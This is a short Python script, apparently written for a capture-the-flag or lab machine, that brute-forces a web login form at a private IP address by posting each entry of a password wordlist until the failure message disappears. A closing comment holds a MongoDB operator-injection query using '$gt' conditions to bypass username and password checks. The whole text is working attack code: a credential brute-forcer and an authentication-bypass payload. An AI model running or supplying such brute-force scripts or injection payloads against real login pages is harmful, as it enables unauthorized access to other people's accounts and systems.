#!/usr/bin/env python3
import requests
import re


with open('Custom_password_list_Brute_2020.txt', 'r') as f:
	passwords = f.read().split('\n')

	url = 'http://10.10.100.200:59874/'

	count = 1
	for passwd in passwords:
		params = {
		"password": passwd,
		"submit": ""
		}

		response = requests.post(url, params)
		thenga = re.findall('Incorrect Password!',response.text)
		if len(thenga) == 1:
			print(count, "NOPE!")
			count += 1
		else:
			print("==========PASSWORD FOUND===========", passwd)
			break


#$collection->find(array("username" => array("$gt" => 1),"passwd" => array("$gt" => 1)));

	
	